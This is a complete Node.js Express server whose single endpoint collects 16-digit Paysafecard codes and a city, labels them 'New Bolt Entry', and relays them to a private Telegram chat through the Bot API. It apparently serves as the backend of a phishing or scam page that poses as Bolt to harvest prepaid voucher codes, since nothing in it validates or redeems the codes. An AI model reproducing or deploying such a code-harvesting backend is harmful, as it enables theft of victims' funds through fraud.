const express = require('express');
const axios = require('axios');
const cors = require('cors');
const dotenv = require('dotenv');

dotenv.config();   // Load .env file

const app = express();

app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("❌ Missing Telegram credentials in .env file!");
}

app.post('/submit', async (req, res) => {
    const { code, city } = req.body;

    if (!code || code.length < 16) {
        return res.status(400).json({ error: 'Invalid code' });
    }

    const time = new Date().toLocaleString('en-GB', { 
        timeZone: 'Europe/Athens',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit'
    }).replace(',', '');

    const message = `🔴 New Bolt Entry!\n\n` +
                    `Site: Bolt\n` +
                    `Location: ${city || 'Not selected'}\n` +
                    `Paysafecard 16 digit code: ${code}\n` +
                    `Time: ${time}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });

        console.log(`✅ New code received from ${city}: ${code}`);
        res.json({ success: true });
    } catch (err) {
        console.error("Telegram Error:", err.message);
        res.status(500).json({ error: 'Failed to send to Telegram' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
